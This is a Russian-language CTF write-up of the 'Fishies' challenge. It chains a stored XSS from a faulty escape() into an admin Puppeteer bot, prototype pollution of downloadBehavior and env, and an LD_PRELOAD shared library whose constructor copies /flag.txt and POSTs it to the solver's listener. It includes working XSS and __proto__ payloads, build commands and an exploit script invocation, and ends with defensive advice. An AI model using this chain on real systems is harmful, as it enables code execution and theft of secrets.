# Fishies: XSS, загрязнение прототипа и LD_PRELOAD при запуске Chromium

[English](solve.md)

## 0. Полная цепочка

Можно создавать рыбок с ASCII-картинкой и жаловаться на них. Жалоба запускает бота на Puppeteer с правами администратора. Флаг находится в `/flag.txt` внутри контейнера, а обычного HTTP-маршрута для его получения нет.

Рабочая цепочка из четырёх посещений:

```text
ошибка escape() -> stored XSS в админ-боте
 -> админский PATCH -> prototype pollution
 -> наследуемый Puppeteer downloadBehavior
 -> скачивание payload.so в каталог Express static
 -> новое загрязнение env.LD_PRELOAD
 -> следующий Chromium подгружает payload.so
 -> конструктор .so читает /flag.txt и сохраняет копию в статике
 -> GET /static/dl/flag.txt
```

В архиве Git теперь лежат **оригинальный эксплойт**, C-код `.so`, технический аудит Puppeteer и очищенный успешный лог. Это не гипотетическая цепочка. Ранний неудачный отчёт в другом Git-диалоге связан с отсутствием маршрута VPN из той конкретной сессии и не отменяет поздний успешный прогон.

## 1. Как нашли XSS

В `server.js` перед выводом `ascii` в `<pre>` вызывается собственная `escape()`. Она меняет `<`/ `>` на длинные HTML-сущности, но после замены сдвигает индекс на длину подстановки и затем ещё делает обычное увеличение индекса. **Следующий символ оказывается пропущен**.

Если перед `<img` поставить `>`, первый знак экранируется, а следующий `<` остаётся настоящей открывающей скобкой.

Проверка из сохранённого лога:

```text
POST /api/fish
{"ascii":"><img src=x onerror=\"window.__probe=1\">","fishData":{}}
-> 200 {"id":5}
```

В HTML затем появляется:

```html
<pre class="fish-detail__ascii">&gt;<img src=x onerror="window.__probe=1"&gt;</pre>
```

То есть внутри `<pre>` уже реальный `<img>`; ошибочный `src=x` вызывает `onerror`. Сам факт вызова `escape()` не защищает, если реализация теряет символы из-за неправильного расчёта индексов.

## 2. Что даёт бот с админскими правами

`POST /api/fish/:id/report` ставит рыбку в очередь проверки. `visitFish` запускает headless Puppeteer, устанавливает HttpOnly-cookie администратора и открывает рыбку. Внутри такого браузера JavaScript нашего `onerror` выполняется в контексте авторизованной страницы.

В ранней проверке обработчик сделал `fetch()` на наш HTTP-сервер; слушатель получил запрос. Очищенный лог подтверждает:

```text
POST /api/fish/6/report -> 200 "review queued"
на слушателе получено GET /ping_channel
```

Это доказывает исполнение JS у бота. HttpOnly-cookie прочитать нельзя, но и не требуется: запросы идут с правами самого браузера.

## 3. От админского PATCH к Object.prototype

В приложении есть админский маршрут:

```text
PATCH /api/admin/fish/:id/fishData
Content-Type: application/json
```

Обработчик рекурсивно сливает присланный JSON с `fishData` через `combine(target,source)`. Ключ `__proto__` не фильтруется. После `JSON.parse` он становится собственным ключом входного объекта, и рекурсия затрагивает `Object.prototype`. После этого другие объекты процесса могут **наследовать подставленные поля**, которых у них самих нет.

Первая полезная нагрузка:

```json
{
  "__proto__": {
    "downloadBehavior": {
      "policy": "allow",
      "downloadPath": "/app/static/dl"
    },
    "env": {
      "PATH": "/usr/local/bin:/usr/bin:/bin",
      "HOME": "/app/static/dl"
    }
  }
}
```

Грабли: `{__proto__: {...}}` в JS-литерале меняет прототип и при `JSON.stringify` может не сохранить нужный собственный ключ. Нужен настоящий JSON с текстовым `"__proto__"`. В оригинальном Python-эксплойте он формируется через `json.dumps`.

Вторые грабли: `onerror` находится внутри HTML-атрибута с двойными кавычками. Вложенные кавычки нужно кодировать как `&quot;`; иначе HTML-парсер преждевременно завершает атрибут.

## 4. Почему polluted downloadBehavior реально работает

В задании стоял **Puppeteer 25.16.0**. `visitFish` вызывает `puppeteer.launch()` с `headless`, `args` и `timeout`, но **не задаёт собственные поля `downloadBehavior` и `env`**.

В [evidence/audit-puppeteer-pp.md](evidence/audit-puppeteer-pp.md) прослежено, как `BrowserLauncher` читает эти поля из options через JS-деструктуризацию (которая обращается и к прототипу), а затем передаёт `downloadBehavior` в Chromium CDP:

```text
Browser.setDownloadBehavior(
  behavior = "allow",
  downloadPath = "/app/static/dl"
)
```

Локальный аудит отдельно проверил `HOME`, `HOME + downloadBehavior`, один `downloadBehavior` и несуществующий вложенный каталог. При загрязнённом поле Chromium сохранял файл **именно в указанном downloadPath**; отсутствующий каталог создал сам.

Это наш недостающий способ записи файла на диск: напрямую через обычный API загрузить `.so` было нельзя, но браузер бота смог скачать его в нужный каталог.

## 5. Первые два report: запись .so

Первая вредоносная рыбка выполняет PATCH с `downloadBehavior`, а затем вызывает программное скачивание `payload.so` с HTTP-сервера исследователя (обычно порт 8000).

Почему **два** посещения:

1. При первом посещении XSS меняет прототип. Но Chromium для этого посещения уже запущен и новые настройки на него не влияют.
2. При втором посещении стартует новый Chromium, наследует `downloadBehavior` и скачивает `payload.so` в `/app/static/dl`.

В сохранённом живом логе:

```text
report, заход 1 -> 200 "review queued"
report, заход 2 -> 200 "review queued"
GET /static/dl/payload.so -> 200, size=15728
```

Этот GET — важная контрольная точка. Он отдельно доказывает, что файл физически оказался в директории, которую раздаёт Express. Без HTTP 200 здесь рано переходить к `LD_PRELOAD`.

При политике `allow` имя файла обычно берётся из URL, поэтому `.../payload.so` сохраняется под предсказуемым именем.

## 6. Третий и четвёртый report: LD_PRELOAD

Вторая рыбка отправляет новый PATCH:

```json
{"__proto__":{"env":{"LD_PRELOAD":"/app/static/dl/payload.so"}}}
```

Третий report устанавливает переменную в наследуемые опции; четвёртый запускает новый Chromium, который получает `LD_PRELOAD`.

Важная деталь из аудита: `env` при запуске Puppeteer передаётся дочернему процессу **целиком**, а не объединяется с `process.env`. Поэтому оригинальный эксплойт дополнительно задаёт `PATH` и в подготовительном варианте `HOME`, иначе браузер может не стартовать.

В приложенном [scripts/pwn.c](scripts/pwn.c) используется конструктор ELF:

```c
__attribute__((constructor)) static void run(void) {
    /* открывает FLAG_PATH, копирует файл в static и отправляет POST */
}
```

Конструктор вызывается при загрузке библиотеки, без явного вызова функции из Node.js. Он читает `/flag.txt`, сохраняет `/app/static/dl/flag.txt` и дополнительно пытается отправить содержимое `POST /flag` на наш слушатель.

Собрать для локальной лаборатории можно так:

```bash
gcc -shared -fPIC -O2 \
  -DLHOST='"127.0.0.1"' -DLPORT=4466 \
  -o payload.so scripts/pwn.c
```

Для другого инстанса `LHOST` задаётся адресом, достижимым из контейнера, либо сборку автоматически выполняет `exploit.py`.

## 7. Итоговые доказательства

Очищенный протокол настоящего прогона:

```text
report, заход 1 -> 200
report, заход 2 -> 200
GET /static/dl/payload.so -> 200 (15728 байт)
report, заход 3 -> 200
report, заход 4 -> 200
слушатель: POST /flag, содержимое PP{MASK}
GET /static/dl/flag.txt -> 200, PP{MASK}
```

В исходных `solve_*.txt` из архива отдельно записано чтение `/static/dl/flag.txt` с настоящего CTF-инстанса и последующая сдача флага. В Git полная строка скрыта.

Раннее «флага нет» в отдельном диалоге относилось к сессии, в которой VPN-маршрут был недоступен. Это **не** тот запуск, который позже дал сохранённый флаг.

## 8. Как повторить

Опубликован настоящий [scripts/exploit.py](scripts/exploit.py):

```bash
python3 scripts/exploit.py \
  --host http://<host> \
  --lhost <адрес-слушателя> \
  --lport 4466 \
  --http-port 8000
```

Скрипт компилирует `payload.so`, создаёт две рыбки, по очереди инициирует четыре проверки с паузами для бота, проверяет скачивание библиотеки и пытается прочитать скопированный флаг. **HTTP-раздачу `.so` и POST-слушатель он не запускает сам** — это требования его рабочего окружения. `--setup-only` показывает сформированные ASCII-payload до запуска.

## 9. Тупики и причины

- HttpOnly-cookie бота читать не нужно: XSS сразу делает админские запросы.
- Prototype pollution сам по себе не исполняет команды. Недостающим «писателем» оказался `downloadBehavior`.
- Идея с гаджетом Handlebars исследовалась, но рабочей цепочке не понадобилась.
- Повторять PATCH и ожидать влияния на уже запущенный браузер бесполезно: нужен новый `launch`.
- При подмене `env` важно передать `PATH`, иначе Chromium может не стартовать.
- При неправильном JS-литерале `__proto__` теряется при сериализации.
- Для `LD_PRELOAD` нужно предсказуемое имя скачанного файла, поэтому учитывался basename URL.

## 10. Защита

Нельзя вручную экранировать HTML через небезопасные сдвиги индекса в изменяемой строке. Нужен контекстно корректный HTML-encoder. При рекурсивном merge фильтровать `__proto__`, `constructor`, `prototype` или использовать словари без прототипа. Боту не следует давать доступ к секретам основного процесса и право записи в раздаваемые статикой каталоги. Настройки запуска Chromium должны быть проверены и зафиксированы.
